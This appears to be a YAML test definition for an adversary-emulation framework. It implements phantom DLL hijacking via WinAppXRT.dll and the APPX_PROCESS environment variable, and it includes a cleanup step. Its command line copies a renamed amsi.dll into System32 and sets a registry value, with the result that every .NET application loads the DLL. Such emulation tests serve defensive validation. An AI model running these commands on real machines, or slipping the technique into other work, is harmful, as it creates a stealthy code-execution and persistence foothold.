- requirements: []
  name: Soumaia ART Tests - Phantom Dll Hijacking - WinAppXRT.dll
  description: ".NET components (a couple of DLLs loaded anytime .NET apps are executed) when they are loaded they look for an environment variable called APPX_PROCESS\nSetting the environmental variable and dropping the phantom WinAppXRT.dll in e.g. c:\\windows\\system32 (or any other location accessible via PATH) will ensure the \nWinAppXRT.dll is loaded everytime user launches an application using .NET.\n\nUpon successful execution, amsi.dll will be copied and renamed to WinAppXRT.dll and then WinAppXRT.dll will be copied to system32 folder for loading during execution of any .NET application. (requires elevation)"
  tactic: stealth
  technique_id: T1574.001
  technique_name: 'Hijack Execution Flow: DLL'
  executors:
  - cleanup:
    - reg delete "HKEY_CURRENT_USER\Environment" /v APPX_PROCESS /f & del %windir%\System32\WinAppXRT.dll & del %APPDATA%\WinAppXRT.dll
    timeout: 60
    platform: windows
    name: cmd
    payloads: []
    parsers: []
    command: copy %windir%\System32\amsi.dll %APPDATA%\amsi.dll & ren %APPDATA%\amsi.dll WinAppXRT.dll & copy %APPDATA%\WinAppXRT.dll %windir%\System32\WinAppXRT.dll & reg add "HKEY_CURRENT_USER\Environment" /v APPX_PROCESS /t REG_EXPAND_SZ /d "1" /f
  id: deff8563-4a0b-5daf-bb02-a13cd6f55f29
